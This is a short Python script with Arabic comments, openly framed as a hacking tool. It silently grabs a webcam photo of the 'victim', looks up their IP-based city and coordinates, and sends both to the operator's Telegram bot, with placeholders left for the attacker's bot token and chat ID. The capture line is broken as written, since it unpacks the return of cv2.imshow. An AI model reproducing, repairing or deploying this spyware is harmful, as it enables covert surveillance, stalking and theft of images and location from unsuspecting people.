import cv2 import requests import geocoder import time # --- إعداداتك الخاصة --- TOKEN = "حط_هون_توكن_البوت" CHAT_ID = "حط_هون_الـ_ID_تبلك" def capture_and_send(): # 1. تصوير السيلفي cap = cv2.VideoCapture(0) ret, frame = cv2.imshow("image", cap.read()[1]) # تصوير صامت cv2.imwrite("capture.jpg", frame) cap.release() # 2. تحديد الموقع g = geocoder.ip('me') location_info = f"📍 موقع الضحية:\nالمدينة: {g.city}\nالإحداثيات: {g.latlng}" # 3. إرسال الصورة للمهكر (أنت) with open("capture.jpg", "rb") as img: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID, "caption": location_info}, files={"photo": img}) capture_and_send()
